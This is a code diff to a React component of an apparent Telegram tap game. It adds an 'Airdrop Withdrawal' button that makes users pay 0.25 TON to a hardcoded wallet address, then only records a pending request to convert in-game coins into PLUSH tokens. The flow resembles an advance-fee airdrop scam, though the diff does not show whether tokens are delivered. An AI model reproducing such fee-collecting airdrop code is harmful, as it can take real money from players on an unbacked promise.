@@ -2,15 +2,18 @@ import React, { useState, useEffect, useRef } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
 import { useGameStore } from '../store/useGameStore';
 import { formatCurrency, formatNumber } from '../lib/utils';
-import { Zap, Coins, FerrisWheel, Map, X, CheckCircle2, Wallet, Vault } from 'lucide-react';
+import { Zap, Coins, FerrisWheel, Map, X, CheckCircle2, Wallet, Vault, Loader2 } from 'lucide-react';
 import { audioManager } from '../lib/audio';
 import { CaseOpeningSpinner } from '../components/CaseOpeningSpinner';
 import { GramModal } from '../components/GramModal';
 import { GiftsModal } from '../components/GiftsModal';
 import { TonModal } from '../components/TonModal';
+import { useTonConnectUI } from '@tonconnect/ui-react';
 
 export function Game() {
-  const { balance, energy, maxEnergy, tapMultiplier, addBalance, reduceEnergy, increaseEnergy, offlineEarnings, claimOfflineEarnings } = useGameStore();
+  const { balance, energy, maxEnergy, tapMultiplier, addBalance, reduceEnergy, increaseEnergy, offlineEarnings, claimOfflineEarnings, requestWithdrawal, withdrawals } = useGameStore();
+  const [tonConnectUI] = useTonConnectUI();
+  const [isProcessingAirdrop, setIsProcessingAirdrop] = useState(false);
   const [taps, setTaps] = useState<{ id: number; x: number; y: number }[]>([]);
   const tapIdRef = useRef(0);
   const [showRoadmap, setShowRoadmap] = useState(false);
@@ -20,6 +23,12 @@ export function Game() {
   const [showGramModal, setShowGramModal] = useState(false);
   const [showTonModal, setShowTonModal] = useState(false);
   const [showGiftsModal, setShowGiftsModal] = useState(false);
+
+  useEffect(() => {
+    const handleOpenAirdrop = () => setShowAirdropPopup(true);
+    window.addEventListener('openAirdrop', handleOpenAirdrop);
+    return () => window.removeEventListener('openAirdrop', handleOpenAirdrop);
+  }, []);
   const [showGoToSpinPopup, setShowGoToSpinPopup] = useState(false);
 
   // Energy regeneration
@@ -406,51 +415,122 @@ export function Game() {
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
-            className="fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4"
+            className="fixed inset-0 bg-black/80 backdrop-blur-[10px] z-[100] flex items-end sm:items-center justify-center p-0 sm:p-4"
           >
             <motion.div 
-              initial={{ scale: 0.9, y: 20 }}
-              animate={{ scale: 1, y: 0 }}
-              exit={{ scale: 0.9, y: 20 }}
-              className="bg-[#1c1c1e] border border-white/10 p-6 rounded-3xl flex flex-col items-center w-full max-w-sm shadow-2xl relative"
+              initial={{ y: "100%" }}
+              animate={{ y: 0 }}
+              exit={{ y: "100%" }}
+              transition={{ type: "spring", damping: 25, stiffness: 200 }}
+              className="bg-[#111114] border-t border-white/10 sm:border sm:rounded-[32px] rounded-t-[32px] p-6 flex flex-col items-center w-full max-w-md shadow-2xl relative max-h-[90vh] overflow-y-auto"
             >
+              <div className="w-12 h-1.5 bg-white/10 rounded-full mb-6 sm:hidden shrink-0" />
+              
               <button 
                 onClick={() => setShowAirdropPopup(false)}
-                className="absolute top-4 right-4 text-white/50 hover:text-white"
+                className="absolute top-6 right-6 text-white/50 hover:text-white transition-colors bg-white/5 p-2 rounded-full"
               >
-                <X size={24} />
+                <X size={20} />
               </button>
               
-              <div className="w-20 h-20 bg-gradient-to-tr from-[#00f3ff]/20 to-[#ff7b00]/20 rounded-full flex items-center justify-center mb-6 border border-white/10 shadow-[0_0_30px_rgba(255,123,0,0.3)]">
-                <Wallet size={36} className="text-white drop-shadow-[0_0_10px_rgba(255,255,255,0.8)]" />
+              <div className="w-20 h-20 shrink-0 bg-gradient-to-tr from-[#00f3ff]/20 to-[#00f3ff]/5 rounded-[24px] flex items-center justify-center mb-6 border border-[#00f3ff]/30 shadow-[0_0_30px_rgba(0,243,255,0.15)] relative overflow-hidden group">
+                <div className="absolute inset-0 bg-gradient-to-b from-white/10 to-transparent"></div>
+                <Wallet size={36} className="text-[#00f3ff] drop-shadow-[0_0_10px_rgba(0,243,255,0.8)] relative z-10" />
               </div>
               
-              <h2 className="text-2xl font-bold text-white mb-2">Airdrop Balance</h2>
+              <h2 className="text-2xl font-black text-white mb-2 tracking-tight">Airdrop Withdrawal</h2>
+              <p className="text-white/50 text-center text-sm mb-6 px-4">Convert your in-game coins to real PLUSH tokens. Make sure your TON wallet is connected!</p>
               
-              <div className="flex flex-col items-center justify-center bg-black/40 border border-white/5 rounded-2xl w-full p-6 mb-6">
-                 <div className="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-[#00f3ff] to-[#ff7b00] drop-shadow-[0_0_10px_rgba(255,123,0,0.3)] mb-2">
-                    {(balance / 10000000).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+              <div className="flex flex-col items-center justify-center bg-[#1c1c1e] border border-white/5 rounded-[24px] w-full p-6 mb-6 relative overflow-hidden">
+                 <div className="absolute top-0 right-0 w-32 h-32 bg-[#00f3ff]/5 blur-3xl rounded-full"></div>
+                 
+                 <div className="text-5xl font-black text-transparent bg-clip-text bg-gradient-to-b from-white to-white/60 mb-2 tracking-tighter">
+                    {Math.floor(balance / 10000000).toLocaleString()} <span className="text-2xl text-[#00f3ff] tracking-normal">$PLUSH</span>
                  </div>
-                 <span className="text-xs text-white/50 uppercase tracking-widest font-bold">Plush Tokens</span>
-                 <div className="mt-4 text-[11px] text-white/40 text-center">
-                   Rate: 1,000,000,000 Coins = 100 Tokens
+                 
+                 <div className="mt-4 flex items-center gap-2 bg-[#111114] px-4 py-2 rounded-full border border-white/5">
+                   <div className="w-2 h-2 rounded-full bg-[#00f3ff] animate-pulse"></div>
+                   <span className="text-xs text-white/60 font-medium">Rate: 10,000,000 Coins = 1 PLUSH</span>
                  </div>
               </div>
 
-              <button 
-                onClick={(e) => {
-                  const target = e.currentTarget;
-                  target.innerText = "Coming Soon...";
-                  target.classList.add("opacity-50", "cursor-not-allowed");
-                  setTimeout(() => {
-                    target.innerText = "Withdraw";
-                    target.classList.remove("opacity-50", "cursor-not-allowed");
-                  }, 2000);
-                }}
-                className="w-full py-4 bg-gradient-to-r from-[#00f3ff] to-[#ff7b00] text-white font-bold rounded-xl shadow-[0_0_15px_rgba(255,123,0,0.4)] hover:brightness-110 active:scale-95 transition-all mb-3 text-lg"
-              >
-                Withdraw
-              </button>
+              <div className="w-full relative group">
+                  <div className="absolute -inset-0.5 bg-gradient-to-r from-[#00f3ff] to-blue-500 rounded-2xl blur opacity-30 group-hover:opacity-60 transition duration-500"></div>
+                  <button 
+                    disabled={isProcessingAirdrop || balance < 10000000}
+                    onClick={async () => {
+                      if (balance < 10000000) return;
+                      const tokenAmount = Math.floor(balance / 10000000);
+                      try {
+                        setIsProcessingAirdrop(true);
+                        if (!tonConnectUI.connected) {
+                          await tonConnectUI.connectWallet();
+                        }
+                        if (tonConnectUI.connected) {
+                           const amountNano = Math.floor(0.25 * 1000000000).toString();
+                           const transaction = {
+                             validUntil: Math.floor(Date.now() / 1000) + 60,
+                             messages: [
+                               {
+                                 address: "UQCTZAMbXoN5T43K9gJXH8GYWBmIstXrUrdoV9kv3btN1Ad3",
+                                 amount: amountNano,
+                               }
+                             ]
+                           };
+                           await tonConnectUI.sendTransaction(transaction);
+                           
+                           const walletStr = tonConnectUI.account?.address || 'UnknownWallet';
+                           await requestWithdrawal(tokenAmount, tokenAmount * 10000000, walletStr);
+                           
+                           const twa = (window as any).Telegram?.WebApp;
+                           if (twa?.HapticFeedback) twa.HapticFeedback.notificationOccurred('success');
+                           twa?.showAlert(`Withdrawal of ${tokenAmount} PLUSH requested successfully!`);
+                           setShowAirdropPopup(false);
+                        }
+                      } catch (e: any) {
+                        console.error("Airdrop withdrawal failed", e);
+                        const twa = (window as any).Telegram?.WebApp;
+                        if (twa?.showAlert) {
+                            twa.showAlert("Transaction cancelled or failed (fee required: 0.25 TON)");
+                        }
+                      } finally {
+                        setIsProcessingAirdrop(false);
+                      }
+                    }}
+                    className="relative w-full py-4 bg-[#111114] text-white font-bold rounded-2xl border border-white/10 hover:bg-[#1c1c1e] active:scale-95 transition-all text-lg flex items-center justify-center gap-3 disabled:opacity-50 disabled:cursor-not-allowed"
+                  >
+                    {isProcessingAirdrop ? <Loader2 size={24} className="animate-spin text-[#00f3ff]" /> : (
+                      <>
+                        Withdraw PLUSH <span className="text-[10px] font-normal text-white/50 bg-white/5 px-2 py-1 rounded-lg ml-2 uppercase tracking-wide">Fee: 0.25 TON</span>
+                      </>
+                    )}
+                  </button>
+              </div>
+              
+              {withdrawals && withdrawals.filter(w => w.token === 'PLUSH').length > 0 && (
+                 <div className="w-full mt-8 space-y-3">
+                    <h4 className="text-white/40 font-bold text-[10px] uppercase tracking-[0.2em] text-center mb-4">Recent Withdrawals</h4>
+                    {withdrawals.filter(w => w.token === 'PLUSH').slice(0, 5).map((w: any) => (
+                       <div key={w.id} className="flex justify-between items-center bg-[#1c1c1e] p-4 rounded-2xl border border-white/5 shadow-inner">
+                          <div className="flex flex-col gap-1">
+                             <span className="text-white font-bold text-sm tracking-wider">{w.amount} PLUSH</span>
+                             <span className="text-white/40 font-mono text-[10px]">{new Date(w.timestamp).toLocaleDateString()} {new Date(w.timestamp).toLocaleTimeString()}</span>
+                          </div>
+                          {w.status === 'pending' ? (
+                             <span className="text-yellow-400 text-[10px] uppercase tracking-wider font-bold bg-yellow-400/10 border border-yellow-400/20 px-3 py-1.5 rounded-lg flex items-center gap-1.5">
+                               <div className="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-pulse"></div>
+                               Reviewing
+                             </span>
+                          ) : (
+                             <span className="text-green-400 text-[10px] uppercase tracking-wider font-bold bg-green-400/10 border border-green-400/20 px-3 py-1.5 rounded-lg flex items-center gap-1.5">
+                               <div className="w-1.5 h-1.5 rounded-full bg-green-400"></div>
+                               Sent
+                             </span>
+                          )}
+                       </div>
+                    ))}
+                 </div>
+              )}
             </motion.div>
           </motion.div>
         )}
